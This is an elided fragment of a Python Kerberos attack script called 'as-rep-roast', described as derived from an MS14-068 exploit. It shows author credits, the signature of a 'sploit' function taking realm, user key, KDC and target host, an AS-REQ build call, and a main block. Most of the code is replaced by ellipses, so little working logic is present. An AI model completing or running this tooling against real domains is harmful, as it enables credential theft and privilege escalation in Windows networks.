...
# as-rep-roast - based off of MS14-068 Exploit

# as-rep-roast author
# Jason Martinsen

# Original Author - MS14-068
# ------
# Sylvain Monne
...
def sploit(user_realm, user_name, user_key, kdc_a, kdc_b, target_realm, target_service, target_host,
    ...
    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=True)
...
if __name__ == '__main__':
    ...
    sploit(user_realm, user_name, user_key, kdc_a, kdc_b, target_realm, target_service, target_host, filename)
